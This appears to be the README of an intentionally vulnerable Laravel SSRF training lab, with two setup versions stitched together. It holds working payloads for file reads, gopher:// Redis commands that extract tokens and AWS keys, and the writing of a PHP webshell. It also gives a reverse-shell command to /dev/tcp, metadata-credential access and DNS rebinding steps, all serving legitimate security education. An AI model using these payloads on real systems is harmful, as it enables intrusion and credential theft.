# SSRF Vulnerability Lab - Laravel Edition (Simplified)

![Warning](https://img.shields.io/badge/⚠️-Educational%20Only-red)
![Docker](https://img.shields.io/badge/Docker-Required-blue)
![Laravel](https://img.shields.io/badge/Laravel-11.x-orange)

A hands-on lab environment for learning **Server-Side Request Forgery (SSRF)** attacks with **Gopher protocol exploitation** in a safe, isolated environment.

## ⚠️ SECURITY WARNING

**THIS APPLICATION CONTAINS INTENTIONAL SECURITY VULNERABILITIES**

- 🚫 DO NOT deploy in production environments
- 🚫 DO NOT expose to the internet
- ✅ Use ONLY in isolated lab environments
- ✅ For educational and security research purposes only

---

## 🎯 What's New - Simplified Setup!

This lab has been **radically simplified** for a more realistic attack scenario:

### Before ❌
- 6 Docker containers
- Complex networking
- Required `docker exec` commands to verify exploitation
- Unrealistic attacker scenario

### Now ✅
- **2 Docker containers only** (Laravel app + Redis)
- Simple networking
- **Pure web-based exploitation** from your browser
- Realistic attack scenario - no container access needed!

📖 **Read:** [`SIMPLIFIED_SETUP.md`](SIMPLIFIED_SETUP.md) for details on what changed  
📖 **Read:** [`EXPLOITATION.md`](EXPLOITATION.md) for step-by-step exploitation guide

---

## 🏗️ Lab Infrastructure

```
┌─────────────────────┐
│   Attacker          │
│   (Your Browser)    │
│   localhost:8000    │
└──────────┬──────────┘
           │ SSRF with Gopher URL
           ▼
┌─────────────────────────────────────────┐
│  Laravel App Container                  │
│  - SSRF Vulnerability                   │
│  - /public/uploads (shared volume)      │
│  Port 8000                              │
└──────────┬──────────────────────────────┘
           │ Gopher Protocol
           ▼
┌─────────────────────────────────────────┐
│  Redis Container                        │
│  - No authentication                    │
│  - /uploads (shared volume)             │
│  - Writes webshell via SSRF             │
│  Port 6379 (internal only)              │
└─────────────────────────────────────────┘
```

---

## 🚀 Quick Start

### Prerequisites
- Docker & Docker Compose
- At least 1GB free RAM

### Installation

```bash
cd /home/nagato/Desktop/ssrf_lab_laravel/ssrf
docker-compose up -d --build
```

That's it! Access the lab at **http://localhost:8000**

---

## 📖 Exploitation Guides

### 1️⃣ Basic SSRF - File Protocol

**Test local file read:**
```bash
curl -X POST http://localhost:8000/ssrf/basic/check-availability 
  -H "Content-Type: application/json" 
  -d '{"url":"file:///etc/passwd"}'
```

⚠️ **Common mistake:** `file://etc/passwd` (wrong - missing third slash!)  
✅ **Correct:** `file:///etc/passwd` (three slashes for absolute paths)

---

### 2️⃣ Gopher Protocol - Redis Webshell Exploitation

**Quick method - Use the helper script:**
```bash
./generate_gopher_payload.sh
```

This generates the complete Gopher URL and exploitation commands.

**Manual method:**
1. Generate Gopher payload (using Gopherus on your machine)
2. Send Gopher URL via SSRF
3. Redis writes PHP webshell to shared `/uploads/` directory
4. Access webshell at `http://localhost:8000/uploads/shell.php?cmd=id`
5. Get reverse shell via webshell

📖 **Full guide:** See [`EXPLOITATION.md`](EXPLOITATION.md) for detailed steps

---

## 🔧 Key Files

- **`SIMPLIFIED_SETUP.md`** - What changed and why
- **`EXPLOITATION.md`** - Detailed exploitation walkthrough
- **`generate_gopher_payload.sh`** - Auto-generate Gopher payloads
- **`docker-compose.yml`** - Simplified 2-container setup

---

## 🛠️ Quick Commands

### Verify installation
```bash
docker-compose ps
```

You should see:
- `ssrf_lab_app` (Laravel)
- `ssrf_lab_redis` (Redis)

### Test basic SSRF
```bash
curl -X POST http://localhost:8000/ssrf/basic/check-availability 
  -H "Content-Type: application/json" 
  -d '{"url":"file:///etc/passwd"}'
```

### Generate Gopher payload
```bash
./generate_gopher_payload.sh
```

### Test webshell (after exploitation)
```bash
curl "http://localhost:8000/uploads/shell.php?cmd=id"
```

### Get reverse shell (after exploitation)
```bash
# Terminal 1: Start listener
nc -lvnp 1234

# Terminal 2: Trigger reverse shell
curl "http://localhost:8000/uploads/shell.php?cmd=bash%20-c%20'sh%20-i%20%3E%26%20/dev/tcp/172.20.0.1/1234%200%3E%261'"
```

---

## 🐛 Troubleshooting

### Containers won't start
```bash
docker-compose down
docker-compose up -d --build
```

### Check Redis connectivity
```bash
docker exec ssrf_lab_app nc -zv redis 6379
```

### View logs
```bash
docker-compose logs -f
```

### Verify shared volume
```bash
# Redis side
docker exec ssrf_lab_redis ls -la /uploads/

# Laravel side
docker exec ssrf_lab_app ls -la /var/www/html/public/uploads/
```

---

## 🧹 Cleanup

```bash
# Stop containers
docker-compose down

# Remove volumes (deletes data)
docker-compose down -v

# Remove everything
docker-compose down -v --rmi all
```

---

## 🎓 Learning Objectives

After completing this lab, you will understand:

- ✅ How SSRF vulnerabilities work
- ✅ File protocol exploitation (`file://`)
- ✅ Gopher protocol basics
- ✅ Redis protocol (RESP)
- ✅ Writing webshells via SSRF
- ✅ Getting reverse shells through webshells
- ✅ Realistic web-based exploitation workflow

---

## 📝 License

This project is for **educational purposes only**. Use responsibly.

---

**Remember:** Always practice ethical hacking. Only test systems you have explicit permission to test.



## 📚 What You'll Learn

This lab covers three major SSRF attack vectors:

### 1. **Basic SSRF** 🎯
- Exploiting URL fetchers without validation
- Accessing internal network services
- Port scanning internal infrastructure
- File protocol exploitation (`file://`)
- Cloud metadata endpoint access

### 2. **Gopher Protocol Exploitation** 🔧
- Understanding Gopher protocol basics
- Crafting Gopher payloads for Redis
- Extracting sensitive data from Redis
- Interacting with MySQL via Gopher
- Raw TCP protocol manipulation

### 3. **DNS Rebinding Attacks** 🌐
- Bypassing IP-based validation
- Time-of-Check Time-of-Use (TOCTOU) vulnerabilities
- DNS TTL manipulation
- Webhook validation bypass

## 🏗️ Lab Infrastructure

```
┌─────────────────────────────────────────────────────────┐
│                    Docker Network                        │
│                                                          │
│  ┌─────────────┐    ┌──────────────┐   ┌────────────┐  │
│  │   Laravel   │───▶│  Internal    │   │   Redis    │  │
│  │     App     │    │     API      │   │  (6379)    │  │
│  │  (Port 8000)│    │ (No External │   │            │  │
│  └─────────────┘    │    Access)   │   └────────────┘  │
│         │           └──────────────┘          │         │
│         │                                     │         │
│         ▼                                     ▼         │
│  ┌─────────────┐    ┌──────────────┐   ┌────────────┐  │
│  │    MySQL    │    │   Metadata   │   │    DNS     │  │
│  │   (3306)    │    │   Server     │   │  Rebind    │  │
│  └─────────────┘    └──────────────┘   └────────────┘  │
└─────────────────────────────────────────────────────────┘
```

### Services Included:

- **Laravel Application** - Vulnerable web app (Port 8000)
- **MySQL Database** - Contains sensitive data (Port 3306)
- **Redis Server** - Stores secrets and session data (Port 6379)
- **Internal API** - Simulates internal microservice (No external access)
- **Metadata Server** - Simulates cloud metadata endpoints
- **DNS Rebinding Server** - For advanced DNS attacks (Port 5300)

## 🚀 Quick Start

### Prerequisites

- Docker & Docker Compose installed
- Git
- At least 2GB free RAM

### Installation

1. **Navigate to the project directory:**
   ```bash
   cd /home/nagato/Desktop/ssrf_lab_laravel/ssrf
   ```

2. **Build and start Docker containers:**
   ```bash
   docker-compose up -d --build
   ```

3. **Install Laravel dependencies:**
   ```bash
   docker exec -it ssrf_lab_app composer install
   ```

4. **Generate application key:**
   ```bash
   docker exec -it ssrf_lab_app php artisan key:generate
   ```

5. **Access the lab:**
   ```
   http://localhost:8000
   ```

### Verify Installation

Check all containers are running:
```bash
docker-compose ps
```

You should see:
- `ssrf_lab_app` (Laravel)
- `ssrf_lab_mysql` (MySQL)
- `ssrf_lab_redis` (Redis)
- `ssrf_lab_internal_api` (Internal API)
- `ssrf_lab_metadata` (Metadata server)
- `ssrf_lab_dns` (DNS rebinding server)

## 📖 Lab Walkthroughs

### Lab 1: Basic SSRF Exploitation

#### Objective
Access internal services and retrieve sensitive data.

#### Targets
```bash
# Internal flag endpoint
http://localhost:8000/ssrf/basic/internal-flag

# Internal API endpoints (via Docker network)
http://internal_api/admin/config
http://internal_api/admin/users
http://internal_api/flag

# Cloud metadata simulation
http://metadata_server/latest/meta-data/iam/security-credentials/admin-role
```

#### Steps
1. Navigate to http://localhost:8000/ssrf/basic
2. Try the **URL Fetcher** with:
   ```
   http://internal_api/flag
   ```
3. Try accessing localhost:
   ```
   http://localhost:8000/ssrf/basic/internal-flag
   ```
4. Access metadata service:
   ```
   http://metadata_server/latest/meta-data/iam/security-credentials/admin-role
   ```

#### Expected Flags
- `FLAG{B4S1C_SSRF_3XPL01T3D}`
- `FLAG{SSRF_1NT3RN4L_API_3XPL01T3D}`

---

### Lab 2: Gopher Protocol Exploitation

#### Objective
Use Gopher protocol to interact with Redis and extract sensitive data.

#### Setup
1. Navigate to http://localhost:8000/ssrf/gopher
2. Click "Initialize Redis with Secrets" to populate Redis

#### Understanding Gopher

Gopher URL format:
```
gopher://<host>:<port>/_<URL-encoded-payload>
```

Redis uses RESP (REdis Serialization Protocol):
```
*<number of arguments>\r\n
$<length of argument>\r\n
<argument>\r\n
```

#### Example Payloads

**List all Redis keys:**
```
gopher://redis:6379/_*1%0d%0a$4%0d%0aKEYS%0d%0a$1%0d%0a*%0d%0a
```

**Get flag from Redis:**
```
gopher://redis:6379/_*2%0d%0a$3%0d%0aGET%0d%0a$4%0d%0aflag%0d%0a
```

**Get admin token:**
```
gopher://redis:6379/_*2%0d%0a$3%0d%0aGET%0d%0a$11%0d%0aadmin_token%0d%0a
```

**Get AWS credentials:**
```
gopher://redis:6379/_*2%0d%0a$3%0d%0aGET%0d%0a$14%0d%0aaws_secret_key%0d%0a
```

#### Manual Payload Construction

To create a Gopher payload for `GET api_key`:

1. Redis command: `GET api_key`
2. RESP format:
   ```
   *2\r\n
   $3\r\n
   GET\r\n
   $7\r\n
   api_key\r\n
   ```
3. URL encode `\r\n` as `%0d%0a`:
   ```
   *2%0d%0a$3%0d%0aGET%0d%0a$7%0d%0aapi_key%0d%0a
   ```
4. Final Gopher URL:
   ```
   gopher://redis:6379/_*2%0d%0a$3%0d%0aGET%0d%0a$7%0d%0aapi_key%0d%0a
   ```

#### Expected Flags
- `FLAG{G0PH3R_R3D1S_3XPL01T3D}`

#### Secrets to Extract
- `admin_token`
- `api_key`
- `aws_access_key`
- `aws_secret_key`
- `database_password`

---

### Lab 3: DNS Rebinding Attack

#### Objective
Bypass IP-based validation using DNS rebinding and TOCTOU vulnerabilities.

#### How DNS Rebinding Works

```
┌─────────────────────────────────────────────────────┐
│ 1. Client requests: http://evil.com                 │
│                                                      │
│ 2. Server validates:                                │
│    DNS Lookup #1: evil.com → 1.2.3.4 (public IP)   │
│    ✓ Validation PASSES (not private IP)            │
│                                                      │
│ 3. Time delay / Processing...                       │
│    DNS TTL expires                                  │
│                                                      │
│ 4. Server makes request:                            │
│    DNS Lookup #2: evil.com → 127.0.0.1 (localhost) │
│    ⚠️ Request goes to INTERNAL service!             │
└─────────────────────────────────────────────────────┘
```

#### Attack Steps

1. Navigate to http://localhost:8000/ssrf/dns-rebinding

2. **Test direct access (will fail):**
   ```
   http://127.0.0.1:8000/ssrf/dns-rebinding/internal-flag
   ```
   Result: Blocked by IP validation

3. **Bypass validation:**
   - Enable "Bypass IP validation" checkbox
   - Use localhost URL:
     ```
     http://localhost:8000/ssrf/dns-rebinding/internal-flag
     ```

4. **Exploit TOCTOU in webhooks:**
   - Validate webhook with public URL
   - DNS changes between validation and execution
   - Webhook executes against internal service

#### Expected Flags
- `FLAG{DNS_R3B1ND1NG_3XPL01T3D}`

---

## 🛠️ Manual Testing with cURL

### Basic SSRF
```bash
# Access internal API
curl -X POST http://localhost:8000/ssrf/basic/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://internal_api/flag"}'

# Access metadata service
curl -X POST http://localhost:8000/ssrf/basic/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://metadata_server/latest/meta-data/iam/security-credentials/admin-role"}'
```

### Gopher Protocol
```bash
# List Redis keys
curl -X POST http://localhost:8000/ssrf/gopher/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"gopher://redis:6379/_*1%0d%0a$4%0d%0aKEYS%0d%0a$1%0d%0a*%0d%0a"}'

# Get flag from Redis
curl -X POST http://localhost:8000/ssrf/gopher/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"gopher://redis:6379/_*2%0d%0a$3%0d%0aGET%0d%0a$4%0d%0aflag%0d%0a"}'
```

### DNS Rebinding
```bash
# Bypass IP validation
curl -X POST http://localhost:8000/ssrf/dns-rebinding/fetch \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:8000/ssrf/dns-rebinding/internal-flag","bypass_check":true}'
```

## 🔍 Useful Commands

### Access Redis directly
```bash
docker exec -it ssrf_lab_redis redis-cli
> KEYS *
> GET flag
> GET admin_token
```

### Access MySQL directly
```bash
docker exec -it ssrf_lab_mysql mysql -u ssrf_user -pssrf_pass ssrf_lab
> SELECT * FROM secrets;
> SELECT * FROM users;
```

### Check Internal API
```bash
docker exec -it ssrf_lab_app curl http://internal_api/admin/config
docker exec -it ssrf_lab_app curl http://internal_api/flag
```

### View logs
```bash
# Application logs
docker logs ssrf_lab_app

# All services
docker-compose logs -f
```

## 🧹 Cleanup

Stop and remove all containers:
```bash
docker-compose down
```

Remove volumes (deletes all data):
```bash
docker-compose down -v
```

Remove images:
```bash
docker-compose down --rmi all
```

## 🐛 Troubleshooting

### Containers won't start
```bash
# Check logs
docker-compose logs

# Rebuild containers
docker-compose down
docker-compose up -d --build --force-recreate
```

### Permission errors
```bash
# Fix Laravel permissions
docker exec -it ssrf_lab_app chown -R www-data:www-data /var/www/html
docker exec -it ssrf_lab_app chmod -R 755 /var/www/html/storage
```

### Redis connection issues
```bash
# Test Redis connectivity
docker exec -it ssrf_lab_app redis-cli -h redis ping
```

### Cannot access internal_api
Make sure you're using the correct hostname in Docker network:
- ✅ `http://internal_api/flag`
- ❌ `http://localhost/flag`

## 🏆 Challenges & Flags

- [ ] **FLAG{B4S1C_SSRF_3XPL01T3D}** - Access internal flag endpoint
- [ ] **FLAG{SSRF_1NT3RN4L_API_3XPL01T3D}** - Access internal API service
- [ ] **FLAG{G0PH3R_R3D1S_3XPL01T3D}** - Extract flag from Redis via Gopher
- [ ] **FLAG{DNS_R3B1ND1NG_3XPL01T3D}** - Bypass IP validation
- [ ] Extract AWS credentials from metadata server
- [ ] Retrieve admin API token from Redis
- [ ] Access MySQL database via Gopher (advanced)

## 📝 License

This project is for **educational purposes only**. Use responsibly.

---

**Remember:** Always practice ethical hacking. Only test systems you have explicit permission to test.
